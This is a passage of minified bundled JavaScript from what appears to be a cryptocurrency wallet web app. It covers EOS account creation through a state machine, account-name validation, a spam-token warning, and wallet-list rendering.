                let {creationState: t, updateStage: a, updateError: n, persistFSMState: r, createEosWallet: l, finish: s} = e;
                create_address_state_machine_defineProperty(this, "finish", void 0);
                create_address_state_machine_defineProperty(this, "updateStage", void 0);
                create_address_state_machine_defineProperty(this, "updateError", void 0);
                create_address_state_machine_defineProperty(this, "createEosWallet", void 0);
                create_address_state_machine_defineProperty(this, "persistFSMState", void 0);
                create_address_state_machine_defineProperty(this, "creatorState", void 0);
                create_address_state_machine_defineProperty(this, "stateMachine", void 0);
                create_address_state_machine_defineProperty(this, "setHooks", (e => {
                    let {updateError: t, persistFSMState: a, createEosWallet: n, finish: r} = e;
                    this.updateError = t;
                    this.persistFSMState = a;
                    this.createEosWallet = n;
                    this.finish = r;
                    return this
                }
                ));
                create_address_state_machine_defineProperty(this, "initStateMachine", ( () => {
                    this.stateMachine = new StateMachineEngine({
                        context: {
                            init: qE.READY,
                            methods: {
                                [qE.CREATE_API_TX_RECORD]: async () => {
                                    const {accountName: e, payment: t} = this.creatorState;
                                    await runWithReplyCountLoop({
                                        func: async () => {
                                            const {wallet: a} = this.creatorState
                                              , n = await Se.Z.getApiByWallet(a)
                                              , {data: r} = await U.nW.post("/api/v1/internal/eos/transaction", {
                                                accountName: e,
                                                payment: t
                                            });
                                            if (!r.createdAt)
                                                throw new Error("Faild to create tx record");
                                            const l = parseFloat((0,
                                            Ko.$q)(await n.getDustThreshold(), n.precision));
                                            r.payment.from.amount = Math.max(l, r.payment.from.amount);
                                            r.payment.to.amount = Math.max(l, r.payment.to.amount);
                                            this.creatorState.creationApiTx = r;
                                            this.stateMachine.goToState(qE.CREATE_SENT_PAYMENT_TX)
                                        }
                                        ,
                                        countOfErrorReplies: 10,
                                        delayMs: 2e3,
                                        onError: e => {
                                            this.creatorState.error = e;
                                            this.creatorState.errorMessage = "Failed to send internal payment transaction. Contact support";
                                            this.creatorState.errorState = qE.CREATE_API_TX_RECORD;
                                            this.stateMachine.goToState(qE.HANDLE_ERROR)
                                        }
                                        ,
                                        fsm: this.stateMachine
                                    })
                                }
                                ,
                                [qE.CREATE_SENT_PAYMENT_TX]: async () => {
                                    YE.log(qE.CREATE_SENT_PAYMENT_TX, this.creatorState);
                                    const {wallet: e} = this.creatorState
                                      , {payment: t} = this.creatorState.creationApiTx;
                                    try {
                                        const a = await Se.Z.getApiByWallet(e)
                                          , {hash: n} = await a.sendTransaction({
                                            addressFrom: e.accountName ? e.accountName : e.address,
                                            addressTo: t.to.address,
                                            amount: t.to.amount.toString(),
                                            privateKey: e.privateKey,
                                            totalBalance: e.balance
                                        });
                                        if (!n)
                                            throw new Error("Adapter doesnt returns hash, something went wrong");
                                        t.transactionId = n;
                                        this.stateMachine.goToState(qE.CREATE_EOS_WALLETS)
                                    } catch (t) {
                                        this.creatorState.error = t;
                                        this.creatorState.errorState = qE.CREATE_SENT_PAYMENT_TX;
                                        this.creatorState.errorMessage = `Failed to send payment transaction. Check your ${e.currency.toUpperCase()} wallet balance`;
                                        this.stateMachine.goToState(qE.HANDLE_ERROR)
                                    }
                                }
                                ,
                                [qE.CREATE_EOS_WALLETS]: async () => {
                                    YE.log(qE.CREATE_EOS_WALLETS, this.creatorState);
                                    try {
                                        const {accountName: e} = this.creatorState;
                                        this.creatorState.eosWallet = await this.createEosWallet(e);
                                        this.stateMachine.goToState(qE.WAIT_FOR_MEMPOOL)
                                    } catch (e) {
                                        this.creatorState.error = e;
                                        this.creatorState.errorMessage = "Failed to create eos wallet in guarda app. Contact support.";
                                        this.creatorState.errorState = qE.CREATE_EOS_WALLETS;
                                        this.stateMachine.goToState(qE.HANDLE_ERROR)
                                    }
                                }
                                ,
                                [qE.WAIT_FOR_MEMPOOL]: async () => {
                                    setTimeout(( () => {
                                        this.stateMachine.goToState(qE.ACTIVATE_EOS_ACCOUNT)
                                    }
                                    ), 1e4)
                                }
                                ,
                                [qE.ACTIVATE_EOS_ACCOUNT]: async () => {
                                    YE.log(qE.CREATE_API_TX_RECORD, this.creatorState);
                                    const {creationApiTx: e, eosWallet: t} = this.creatorState;
                                    await runWithReplyCountLoop({
                                        func: async () => {
                                            e.publicKey = t.publicKey;
                                            const {data: a} = await U.nW.post(`/api/v1/internal/eos/transaction/${e.id}`, e);
                                            if (a.error)
                                                throw new Error(a.error);
                                            this.stateMachine.goToState(qE.DONE)
                                        }
                                        ,
                                        countOfErrorReplies: -1,
                                        delayMs: 5e3,
                                        fsm: this.stateMachine
                                    })
                                }
                                ,
                                [qE.DONE]: async () => {
                                    await this.finish(this.creatorState.eosWallet)
                                }
                            }
                        },
                        errorHandler: async () => {
                            const {error: e, machineState: t, payment: a, accountName: n, publicKey: r, wallet: l, eosWallet: s} = this.creatorState
                              , i = {
                                payment: a,
                                accountName: n,
                                publicKey: r,
                                machineState: t
                            };
                            l && (i.wallet = l.mapToPlainObject());
                            s && (i.eosWallet = s.mapToPlainObject());
                            ge.b.error(ge.d.FAILED_CREATE_EOS, e, i);
                            this.updateError(this.creatorState.errorMessage)
                        }
                        ,
                        transitionHandler: async e => {
                            this.creatorState.machineState = e;
                            await this.persistFSMState(this.creatorState)
                        }
                    })
                }
                ));
                create_address_state_machine_defineProperty(this, "start", ( () => {
                    try {
                        if (!QE) {
                            YE.log("start state machine");
                            this.stateMachine.goToState(this.creatorState.machineState);
                            QE = !0
                        }
                        return
                    } catch (e) {
                        YE.error(`Something went wrong ${e.message}`, e);
                        this.stateMachine.goToState(qE.HANDLE_ERROR)
                    }
                }
                ));
                this.finish = s;
                this.updateStage = a;
                this.updateError = n;
                this.createEosWallet = l;
                this.persistFSMState = r;
                if (XE)
                    return XE;
                YE.log("instance starts");
                if (!t)
                    throw new Error("Machine state not provided");
                this.creatorState = t;
                this.initStateMachine();
                XE = this
            }
        }
        create_address_state_machine_defineProperty(EosAccountCreator, "getInstance", ( () => XE));
        create_address_state_machine_defineProperty(EosAccountCreator, "destroy", ( () => {
            XE && XE.stateMachine.stop();
            XE = null;
            QE = !1
        }
        ));
        create_address_state_machine_defineProperty(EosAccountCreator, "isStarted", ( () => QE));
        const JE = {
            STATUS_SENDING: "Sending fee tx",
            STATUS_CREATING: "Creating account",
            STATUS_ACTIVATING: "Activating account"
        };
        let eh = ""
          , th = !1;
        const clearCreateAddressMetaState = () => {
            eh = "";
            th = !1
        }
        ;
        function CreateAddress(e) {
            let {TOTAL_STEPS: t, ...a} = e;
            const [n,r] = (0,
            O.useState)(0)
              , l = (0,
            $.I0)()
              , s = (0,
            $.v9)(oe.s$)
              , i = (0,
            $.v9)(oe.DU)
              , o = (0,
            $.v9)(Bc)
              , updateStage = e => {
                const t = e.errorState || e.machineState;
                t !== qE.CREATE_API_TX_RECORD && t !== qE.CREATE_SENT_PAYMENT_TX ? t !== qE.CREATE_EOS_WALLETS && t !== qE.WAIT_FOR_MEMPOOL ? t !== qE.ACTIVATE_EOS_ACCOUNT ? t !== qE.DONE ? r(0) : r(3) : r(2) : r(1) : r(0)
            }
              , updateError = async e => {
                eh = e;
                a.onFinish()
            }
              , createEosWallet = async e => {
                if (s && i) {
                    const t = Se.Z.getMetadata({
                        ticker: "eos"
                    })
                      , a = getNewAccountIndexCoin({
                        currency: "eos",
                        backupWallets: o
                    })
                      , n = getNewTitleCoin({
                        currency: "eos",
                        backupWallets: o
                    })
                      , r = `${(null == t ? void 0 : t.title) || "eos"}${Number(n) ? ` ${n}` : ""}`
                      , s = await Se.Z.getApiByCurrency("eos")
                      , c = _e.ZP.getClass({
                        currency: "eos"
                    })
                      , u = await s.getAddressFromMnemonic({
                        mnemonic: i,
                        accountIndex: a
                    })
                      , {privateKey: d, address: m} = u
                      , p = {
                        uuid: generateWalletUUID({
                            mnemonic: i,
                            address: m,
                            currency: "eos"
                        }),
                        currency: "eos",
                        address: m,
                        privateKey: d,
                        title: r,
                        balance: "0",
                        subWallets: [],
                        derivedFromMnemonicUsing: {
                            accountIndex: a
                        }
                    };
                    "publicKey"in u && Object.assign(p, {
                        publicKey: u.publicKey
                    });
                    Object.assign(p, {
                        accountName: e
                    });
                    const f = (new c).recoverFromPlainObject(p);
                    l(rd.addWallet({
                        wallet: f,
                        options: {
                            downloadType: Sm.AFTER_CREATE_WALLET
                        }
                    }));
                    return f
                }
                {
                    const t = _e.ZP.getClass({
                        currency: "eos"
                    })
                      , a = await (new t).create({
                        currency: "eos"
                    });
                    a.accountName = e;
                    l(rd.addWallet({
                        wallet: a,
                        options: {
                            downloadType: Sm.AFTER_CREATE_WALLET
                        }
                    }));
                    return a
                }
            }
              , finish = async e => {
                cc.$.send(cc.d.EOS_CREATE, e.accountName);
                await l(setSecureData(qe, void 0));
                await l(handleDownload(Sm.FORCE));
                l(setActiveWallet(e));
                await l(hideNotification());
                r(3);
                th = !0;
                a.onFinish();
                return !0
            }
              , persistFSMState = async e => {
                const t = {
                    ...e
                };
                t.wallet && (t.wallet = t.wallet.mapToPlainObject());
                t.eosWallet && (t.eosWallet = t.eosWallet.mapToPlainObject());
                updateStage(t);
                await l(setSecureData(qe, t))
            }
            ;
            (0,
            O.useEffect)(( () => {
                const {creationState: e} = a;
                if (e) {
                    if (EosAccountCreator.isStarted()) {
                        var t;
                        null === (t = EosAccountCreator.getInstance()) || void 0 === t || t.setHooks({
                            updateError,
                            persistFSMState,
                            createEosWallet,
                            finish
                        })
                    } else {
                        const t = undefined;
                        new EosAccountCreator({
                            creationState: e,
                            updateError,
                            persistFSMState,
                            createEosWallet,
                            finish
                        }).start()
                    }
                    e.machineState && updateStage(e)
                }
            }
            ), [a.creationState]);
            const getStageIcon = e => e < n ? O.createElement("img", {
                src: HE,
                alt: ""
            }) : e === n ? O.createElement(LoaderDots, {
                visible: !0
            }) : O.createElement("span", null, " ")
              , getStageClass = e => e === n ? OE : e < n ? BE : DE
              , getStageHeader = () => Object.values(JE).map(( (e, t) => {
                const a = getStageClass(t)
                  , n = getStageIcon(t);
                return O.createElement("li", {
                    className: a,
                    key: t
                }, O.createElement("span", {
                    className: RE
                }, n), O.createElement("p", null, e))
            }
            ));
            return O.createElement("div", null, O.createElement("h3", null, "Creating EOS account"), O.createElement("ul", {
                className: WE
            }, getStageHeader()), O.createElement("div", {
                className: ME
            }, eh && O.createElement("div", {
                className: UE
            }, eh), th && O.createElement("div", {
                className: GE
            }, "EOS account has been created.")), O.createElement("div", {
                className: KE
            }, O.createElement("div", {
                className: VE
            }, "Step 3 of ", t), (eh || th) && O.createElement(Yl, {
                onClick: a.handleClosePopup,
                color: "blue",
                size: "big"
            }, "Close")))
        }
        const ah = CreateAddress
          , nh = "info-step_stepInfo_32Oq7"
          , rh = "info-step_requirements_2bn6t"
          , lh = "info-step_footer_3E-EV"
          , sh = undefined
          , info_step = e => {
            let {handleNext: t} = e;
            return O.createElement("div", {
                className: "step1"
            }, O.createElement("h3", null, "Create new EOS wallet"), O.createElement("p", null, "EOS Network has two requirements for creating a new account:"), O.createElement("ul", {
                className: rh
            }, O.createElement("li", null, "an account can be created by someone who already has EOS account"), O.createElement("li", null, "a user should buy some RAM and stake some EOS first.")), O.createElement("p", null, "No worries: we are here to help you! Simlpy click “Create” button and go through 3 swift steps."), O.createElement("div", {
                className: lh
            }, O.createElement("div", null), O.createElement(Yl, {
                onClick: t,
                color: "blue",
                size: "big"
            }, "Ok, got it!")))
        }
          , ih = {
            backButton: "choose-acc-name_backButton_3bhf- styles_dashedNormal_xEvl8",
            valid: "choose-acc-name_valid_L65e9",
            notValid: "choose-acc-name_notValid_1t6ub",
            generateButton: "choose-acc-name_generateButton_2w4lj",
            loaderWrapper: "choose-acc-name_loaderWrapper_2LDNl",
            stepInfo: "choose-acc-name_stepInfo_3yMjb",
            orText: "choose-acc-name_orText_2Ci61",
            footer: "choose-acc-name_footer_1Rh_B"
        };
        let oh;
        function ChooseAccountNameStep(e) {
            const [t,a] = (0,
            O.useState)("")
              , [n,r] = (0,
            O.useState)({
                isValid: !0,
                message: ""
            })
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)()
              , [c,u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)(!1)
              , p = O.createRef();
            (0,
            O.useEffect)(( () => {
                const getApi = async () => {
                    m(!0);
                    const e = await Se.Z.getApiByCurrency("eos");
                    o(e);
                    m(!1)
                }
                ;
                getApi()
            }
            ), []);
            const accountNameValidator = e => {
                let {isValid: t, isAvailable: a} = e;
                return [{
                    rule: () => !!a,
                    message: "An account with the same name already exists"
                }, {
                    rule: () => !!t.isValid,
                    message: t.message
                }]
            }
              , validateAccountName = async e => {
                if (!i)
                    return null;
                let t = !1;
                const a = await i.isAccountName(e);
                try {
                    t = await i.isAccountNameAvailable(e)
                } catch (e) {
                    ge.b.error(ge.d.FAILED_CHECK_EOS_ACCOUNT, e)
                }
                a.isValid && t || u(!0);
                return {
                    isValid: a,
                    isAvailable: t
                }
            }
              , f = {
                timeout: 500,
                timeoutObject: null,
                clear: () => {
                    if (oh) {
                        window.clearTimeout(oh);
                        oh = void 0
                    }
                }
                ,
                trigger: async e => {
                    f.clear();
                    oh = window.setTimeout((async () => {
                        m(!0);
                        const {isValid: t, isAvailable: a} = await validateAccountName(e);
                        s(a);
                        r(t);
                        m(!1)
                    }
                    ), f.timeout)
                }
            }
              , handleAccountNameChange = async e => {
                let {target: {value: t}} = e;
                u(!1);
                a(t);
                s(!1);
                i && r(await i.isAccountName(t));
                f.trigger(t)
            }
              , handleGenerateAccountName = async () => {
                if (!i)
                    return;
                u(!1);
                m(!0);
                const e = await i.createWallet()
                  , {isValid: t, isAvailable: n} = await validateAccountName(e.accountName);
                a(e.accountName);
                s(n);
                r(t);
                m(!1)
            }
              , handleNext = () => {
                var a, r;
                const {isValid: s} = null !== (a = null === (r = p.current) || void 0 === r ? void 0 : r.validate()) && void 0 !== a ? a : {};
                s ? n && l && t && e.handleNext(t) : u(!0)
            }
            ;
            return O.createElement("div", {
                className: "step2"
            }, O.createElement(sf(), {
                ref: p
            }, O.createElement("h3", null, "Choose your EOS account name"), O.createElement("p", null, "The account name should contain 12 symbols (allowed symbols: a-z, 1-5). The first symbol should be a-z."), O.createElement("div", null, O.createElement(lf.ValidatorField, {
                value: {
                    isAccountNameValid: n,
                    isAccountNameAvailable: l
                },
                rules: accountNameValidator({
                    isValid: n,
                    isAvailable: l
                })
            }, (e => {
                let {isValid: a, message: n} = e;
                return O.createElement("div", {
                    className: ih.inputAccountName
                }, O.createElement(pa, {
                    message: n,
                    isInvalid: !a && c
                }, O.createElement(Ea, {
                    value: t,
                    onChange: handleAccountNameChange,
                    autoComplete: "off",
                    onEnter: handleNext,
                    placeholder: "Enter account name",
                    type: "text"
                }), O.createElement("div", {
                    className: ih.generateButton,
                    onClick: handleGenerateAccountName
                }, "Generate")))
            }
            ))), O.createElement("div", {
                className: ih.footer
            }, O.createElement("div", {
                className: ih.loaderWrapper
            }, O.createElement(LoaderDots, {
                visible: d
            }), O.createElement(lf.ValidatorField, {
                value: !d,
                rules: zf.bool
            }, (e => {
                let {isValid: t} = e;
                return !t && c ? O.createElement("div", {
                    className: ih.stepInfo
                }, "Please wait...") : null
            }
            )), !d && O.createElement("div", {
                className: ih.stepInfo
            }, "Step 1 of ", e.TOTAL_STEPS)), O.createElement("div", null, O.createElement("span", {
                className: ih.backButton,
                onClick: e.handlePrev
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleNext
            }, "Next")))))
        }
        const ch = ChooseAccountNameStep;
        var uh = a(65728)
          , dh = a.n(uh)
          , mh = a(68757);
        let ph;
        !function(e) {
            e.coins = "YOUR COINS";
            e.tokens = "YOUR TOKENS";
            e.addTokens = "ADD TOKENS";
            e.addCoins = "ADD COINS"
        }(ph || (ph = {}));
        const fh = a.p + "47f1830b9719e2c119b5b4dac560483a.svg"
          , Eh = {
            tooltip: "spam-token-notify_tooltip_usFrJ",
            selected: "spam-token-notify_selected_pWc_S",
            inList: "spam-token-notify_inList_1C39u",
            exchangeInList: "spam-token-notify_exchangeInList_ArOKz",
            borrowSelected: "spam-token-notify_borrowSelected_1TJVy",
            borrowInList: "spam-token-notify_borrowInList_1IqjC",
            txList: "spam-token-notify_txList_3K3cx"
        }
          , SpamTokenNotify_SpamTokenNotify = e => {
            let {family: t, type: a} = e;
            return t ? O.createElement(tooltip, {
                classNameWrapper: Ht()(Eh.tooltip, a && Eh[a]),
                text: `This is a fake ${t.toUpperCase()} token`,
                width: "150px",
                type: "error"
            }, O.createElement("img", {
                src: fh,
                width: 16,
                height: 16,
                alt: "svg tooltip"
            })) : null
        }
          , hh = {
            setClearStore: (0,
            te.createAction)(Wd)(),
            fetchSpamTokenList: (0,
            te.createAction)(Rd)(),
            setSpamTokenList: (0,
            te.createAction)(Bd)(),
            setFetchError: (0,
            te.createAction)(Od)(),
            initializeSpamTokenListUpdater: (0,
            te.createAction)(Dd)()
        }
          , getSpamTokenLayoutType = e => {
            let {isBorrowWallets: t, isSelected: a} = e;
            return !t && a ? "selected" : t || a ? t && a ? "borrowSelected" : "borrowInList" : "exchangeInList"
        }
        ;
        function useRenderWallets(e) {
            const t = (0,
            $.I0)()
              , [a,n] = (0,
            O.useState)(!1)
              , [r,l] = (0,
            O.useState)("")
              , s = (0,
            $.v9)(_s)
              , i = (0,
            O.useCallback)((e => s.indexOf(e.uuid || "") > -1), [s])
              , o = useSortWallets()
              , {sortBySearchValue: c} = useCMCRate()
              , u = (0,
            $.v9)(eu)
              , d = (0,
            $.v9)(lu)
              , {withAddress: m, isBorrowWallets: p, currenciesToBuy: f} = e
              , E = O.useMemo(( () => debounce(l, 300)), [l])
              , h = (0,
            $.v9)(Md);
            (0,
            O.useEffect)(( () => {
                Object.keys(h).length || t(hh.fetchSpamTokenList())
            }
            ), [t]);
            const g = (0,
            O.useCallback)((e => {
                let {family: t, smartContract: a} = e;
                if (!t || !a)
                    return !1;
                const n = undefined;
                return t.toLowerCase() + a.toLowerCase()in h
            }
            ), [h])
              , hideAddress = e => {
                if (!e)
                    return null;
                const t = undefined;
                return e.split("").map(( (e, t, a) => t <= 5 ? e : 6 === t ? "..." : t >= a.length - 6 ? e : "")).join("")
            }
              , y = (0,
            O.useCallback)((e => {
                if (null == e || !e.target.type) {
                    n(!1);
                    l("")
                }
            }
            ), [])
              , v = (0,
            O.useCallback)(( (t, a, n) => r => {
                var l;
                e.isValidateOnChangeItem && !e.isValidateOnChangeItem(t) || (a ? r.stopPropagation() : null === (l = e.onChange) || void 0 === l || l.call(e, t, n))
            }
            ), [e])
              , _ = (0,
            O.useCallback)(( (t, a, n, r, l) => {
                var s, o, c;
                const p = !!t.multisigId || !(null === (s = t.multisigs) || void 0 === s || !s.length)
                  , f = p && t.multisigId ? `Multisig (${t.minimumSigAmount} of ${null === (o = t.participants) || void 0 === o ? void 0 : o.length})` : "Multisig"
                  , E = t.isWatchOnly
                  , h = t.isHw
                  , y = t.isSubWallet || t.isNewToken || t.isFake || t.isFakeWallet && Boolean(t.family)
                  , v = t.parentUuid && u(t.parentUuid)
                  , _ = d(t.uuid)
                  , w = (0,
                be.II)(t.family)
                  , b = g(t);
                let k;
                k = v ? `${(0,
                be.xG)(null == v ? void 0 : v.currency)} - ${null == v ? void 0 : v.title}` : _ ? `${(0,
                be.xG)(null == _ ? void 0 : _.currency)} - ${null == _ ? void 0 : _.title}` : `${(0,
                be.xG)(null == w ? void 0 : w.currency)} - ${null == w ? void 0 : w.title}`;
                const S = (0,
                be.Ui)((0,
                Ko.i1)(t.balance ? t.balance : 0, e.isSelectorWithValue ? 7 : 13), e.isSelectorWithValue ? 12 : 30)
                  , C = S.length > 7 ? 5 : 8
                  , N = (0,
                be.Pg)({
                    isMultisig: p,
                    isWatchOnly: E,
                    isHw: h,
                    isTestnet: Boolean(t.isTestnet)
                })
                  , T = e.isSelectorWithValue ? n && y ? 7 : 8 : 15
                  , A = t.title || (0,
                be.xG)(null == t ? void 0 : t.ticker) || (0,
                be.xG)(t.currency)
                  , x = (0,
                be.Ui)(A, T, !0)
                  , I = (A.length || 0) > T
                  , P = getSubWalletTitleLength(!!e.isSelectorWithValue, !!n, !!e.isRenderAllExchangeCoinsAndTokens)
                  , L = (0,
                be.Ui)(y ? k : "", P)
                  , F = ((k || "").length || 0) > P;
                return e.getItem ? e.getItem(t, Jl) : O.createElement(O.Fragment, null, O.createElement("div", {
                    className: Jl.mainWalletInfo
                }, O.createElement(IconCurrency, {
                    isDisabled: !r && a,
                    currency: t.currency,
                    className: Ht()(Jl.listTicker, t.isTestnet ? Jl.isTestnet : "", i(t) ? Jl.isHidden : "")
                }), b && O.createElement(SpamTokenNotify_SpamTokenNotify, {
                    type: getSpamTokenLayoutType({
                        isBorrowWallets: e.isBorrowWallets,
                        isSelected: n
                    }),
                    family: t.family
                }), O.createElement("div", {
                    className: Ht()(Jl.currencyInfo, {
                        [Jl.currencyInfoWithValue]: e.isSelectorWithValue,
                        [Jl.currencyInfoWithoutValue]: e.isSelectorWithoutValue,
                        [Jl.currencyInfoWithValueSelected]: e.isSelectorWithValue && n
                    })
                }, O.createElement("span", {
                    className: Ht()(Jl.titleContainer, {
                        [Jl.titleContainerNewSelector]: e.isNewSelector,
                        [Jl.overflowVisible]: e.isSelectorWithValue
                    })
                }, O.createElement("span", {
                    className: Ht()(Jl.titleWrapper, n && !e.isNewSelector && Jl.selectedWrapper, e.isNewSelector && Jl.newSelectorTicker)
                }, e.isNewSelector ? O.createElement(O.Fragment, null, (!n || e.isRenderAllExchangeCoinsAndTokens) && (I ? O.createElement(tooltip, {
                    classNameTooltip: Ht()(Jl.subWalletTooltip, Jl.currencyTooltipText, Jl.colorTooltip),
                    className: Ht()(Jl.walletInfo, Jl.walletInfoAbsolute, Jl.currencyTooltipWrapper),
                    positionVertical: "bottom",
                    text: t.title
                }, O.createElement("span", {
                    className: Ht()(Jl.walletTitle, e.isSelectorWithValue && Jl.walletTitleWithValue, e.isRenderAllExchangeCoinsAndTokens && Jl.displayNone)
                }, x)) : O.createElement("span", {
                    className: Ht()(Jl.walletTitle, e.isSelectorWithValue && Jl.walletTitleWithValue, e.isRenderAllExchangeCoinsAndTokens && Jl.displayNone)
                }, x)), n || e.isRenderAllExchangeCoinsAndTokens ? O.createElement(O.Fragment, null, O.createElement("span", {
                    className: Ht()(Jl.walletInfo, Jl.walletInfoAbsolute)
                }, x)) : O.createElement(tooltip, {
                    classNameTooltip: Ht()(Jl.addressTooltip, Jl.colorTooltip),
                    className: Ht()(Jl.walletInfo, Jl.walletInfoAbsolute),
                    positionVertical: "bottom",
                    text: t.address,
                    left: -5
                }, O.createElement("span", null, t.address ? O.createElement(O.Fragment, null, " ··", null === (c = t.address) || void 0 === c ? void 0 : c.slice(-4)) : ""))) : O.createElement(O.Fragment, null, t.title || (0,
                be.xG)(null == t ? void 0 : t.ticker) || (0,
                be.xG)(t.currency))), !l && e.isNewStyles && O.createElement("div", {
                    className: Ht()(Jl.newTicker, n && Jl.selectedTicker)
                }, (0,
                be.xG)(t.currency))), O.createElement("div", {
                    className: Ht()({
                        [Jl.walletBalance]: e.isSelectorWithValue,
                        [Jl.subInfoFakeWalletSelected]: e.isRenderAllExchangeCoinsAndTokens && n,
                        [Jl.displayNone]: e.isRenderAllExchangeCoinsAndTokens && !n
                    })
                }, e.isRenderAllExchangeCoinsAndTokens && n ? O.createElement(O.Fragment, null, " ", y && O.createElement("div", {
                    className: Jl.inlineBlock
                }, O.createElement(IconCurrency, {
                    isDisabled: !r && a,
                    currency: null == w ? void 0 : w.currency,
                    className: Ht()(Jl.listTicker, t.isTestnet ? Jl.isTestnet : "", i(t) ? Jl.isHidden : ""),
                    isSmallIcon: !0
                })), O.createElement("span", {
                    className: Ht()(Jl.walletInfo, {
                        [Jl.hideInfo]: !y
                    })
                }, L)) : O.createElement(O.Fragment, null, " ", e.addNewWalletForToken && !t.balance ? "Add new wallet" : S, " ", !e.isNewStyles && (0,
                be.Ui)((0,
                be.xG)(t.currency), C), !e.isNewSelector && O.createElement(O.Fragment, null, E ? O.createElement("span", {
                    className: Jl.infoAboutBalance
                }, "WO") : null, t.isTestnet ? O.createElement("span", {
                    className: Jl.infoAboutBalance
                }, "Testnet") : null, h ? O.createElement("span", {
                    className: Jl.infoAboutBalance
                }, "Ledger") : null, p ? O.createElement("span", {
                    className: Jl.infoAboutBalance
                }, n ? "Multisig" : f) : ""))))), e.isNewSelector && O.createElement("div", {
                    className: Ht()(n ? Jl.subInfoWalletSelected : Jl.subInfoWallet, {
                        [Jl.subInfoWalletWithoutValue]: e.isSelectorWithoutValue,
                        [Jl.subInfoWalletWithValues]: e.isSelectorWithValue,
                        [Jl.subInfoWalletWithValuesSelected]: e.isSelectorWithValue && n,
                        [Jl.displayNone]: e.isRenderAllExchangeCoinsAndTokens && n
                    })
                }, O.createElement("div", {
                    className: Ht()(Jl.currencyInfo, Jl.clearMarginLeft, {
                        [Jl.currencyInfoWithValue]: e.isSelectorWithValue,
                        [Jl.currencyInfoWithValueSelected]: e.isSelectorWithValue && n
                    })
                }, O.createElement("div", {
                    className: Jl.walletName
                }, O.createElement("span", {
                    className: Ht()(Jl.titleContainer, {
                        [Jl.titleContainerWithValue]: e.isSelectorWithValue
                    })
                }, F ? O.createElement(tooltip, {
                    classNameTooltip: Ht()(Jl.subWalletTooltip, Jl.colorTooltip),
                    className: Ht()(Jl.walletInfo, n ? "" : Jl.walletInfoAbsolute),
                    positionVertical: "bottom",
                    text: n ? "" : k,
                    left: -25
                }, O.createElement("span", {
                    className: Ht()(Jl.titleWrapper, n && Jl.selectedWrapper, e.isNewSelector && Jl.newSelectorTicker, e.isSelectorWithValue && Jl.selectorWithValueTicker, n && e.isNewSelector && Jl.selectedSubWallet)
                }, y && O.createElement("div", {
                    className: Jl.inlineBlock
                }, O.createElement(IconCurrency, {
                    isDisabled: !r && a,
                    currency: null == w ? void 0 : w.currency,
                    className: Ht()(Jl.listTicker, t.isTestnet ? Jl.isTestnet : "", i(t) ? Jl.isHidden : ""),
                    isSmallIcon: !0
                })), O.createElement("span", {
                    className: Ht()(Jl.walletInfo, {
                        [Jl.hideInfo]: !y
                    })
                }, L))) : O.createElement("span", {
                    className: Ht()(Jl.titleWrapper, n && Jl.selectedWrapper, e.isNewSelector && Jl.newSelectorTicker, e.isSelectorWithValue && Jl.selectorWithValueTicker, n && e.isNewSelector && Jl.selectedSubWallet)
                }, y && O.createElement("div", {
                    className: Jl.inlineBlock
                }, O.createElement(IconCurrency, {
                    isDisabled: !r && a,
                    currency: null == w ? void 0 : w.currency,
                    className: Ht()(Jl.listTicker, t.isTestnet ? Jl.isTestnet : "", i(t) ? Jl.isHidden : ""),
                    isSmallIcon: !0
                })), O.createElement("span", {
                    className: Ht()(Jl.walletInfo, {
                        [Jl.hideInfo]: !y
                    })
                }, L)), O.createElement("div", {
                    className: Ht()(Jl.walletType, {
                        [Jl.walletTypeWithValue]: e.isSelectorWithValue,
                        [Jl.walletTypeWithValueSelected]: e.isSelectorWithValue && n
                    })
                }, N.map(( (e, t) => 0 !== t ? O.createElement(O.Fragment, null, " · ", e) : O.createElement(O.Fragment, null, e)))))))), m && O.createElement("div", {
                    className: Ht()(Jl.addressWrapper, n && Jl.selectedAddressWrapper, a && Jl.disabledAddressWrapper)
                }, hideAddress(t.address)))
            }
            ), [i, e, m, e.isNewSelector])
              , w = (0,
            O.useCallback)(( (t, a) => {
                var n;
                const r = !!t.multisigId
                  , l = t.isWatchOnly
                  , s = t.isHw
                  , o = (0,
                be.II)(t.family)
                  , c = `${(0,
                be.xG)(null == o ? void 0 : o.currency)} - ${null == o ? void 0 : o.title}`
                  , u = g(t);
                return e.getSubItem ? e.getSubItem(t, Jl) : O.createElement(O.Fragment, null, O.createElement("div", {
                    className: Jl.mainWalletInfo
                }, O.createElement(IconCurrency, {
                    isDisabled: a,
                    currency: t.currency,
                    className: Ht()(Jl.listTicker, i(t) ? Jl.isHidden : "", Jl[`ticker-${t.currency}`])
                }), u && O.createElement(SpamTokenNotify_SpamTokenNotify, {
                    type: "inList",
                    family: t.family
                }), O.createElement("div", {
                    className: Ht()(Jl.currencyInfo, {
                        [Jl.currencyInfoWithValue]: e.isSelectorWithValue
                    })
                }, O.createElement("span", {
                    className: Jl.titleContainer
                }, O.createElement("span", {
                    className: Ht()(Jl.titleWrapper, e.isNewSelector && Jl.newSelectorTicker)
                }, e.isNewSelector ? O.createElement(O.Fragment, null, (0,
                be.Ui)(t.title || (0,
                be.xG)(null == t ? void 0 : t.ticker) || (0,
                be.xG)(t.currency), e.isSelectorWithValue ? 6 : 10, !0)) : O.createElement(O.Fragment, null, t.title || (0,
                be.xG)(null == t ? void 0 : t.ticker) || (0,
                be.xG)(t.currency))), e.isNewStyles && O.createElement("div", {
                    className: Ht()(Jl.newTicker)
                }, (0,
                be.xG)(t.currency))), O.createElement("div", null, (0,
                Ko.i1)(t.balance || "0", e.isSelectorWithValue ? 8 : void 0), " ", !e.isNewStyles && (0,
                be.xG)(t.currency), t.isWatchOnly ? O.createElement("span", {
                    className: Jl.infoAboutBalance
                }, "WO") : null, r && !e.isNewSelector ? O.createElement("span", {
                    className: Jl.infoAboutBalance
                }, "Multisig (", t.minimumSigAmount, " of ", null == t || null === (n = t.participants) || void 0 === n ? void 0 : n.length, ")") : ""))), e.isNewSelector && O.createElement("div", {
                    className: Ht()(Jl.subInfoWallet, e.isSelectorWithoutValue && Jl.subInfoWalletWithoutValue)
                }, O.createElement("div", {
                    className: Ht()(Jl.currencyInfo, {
                        [Jl.currencyInfoWithValue]: e.isSelectorWithValue
                    })
                }, O.createElement("div", {
                    className: Jl.walletName
                }, O.createElement(IconCurrency, {
                    currency: null == o ? void 0 : o.currency,
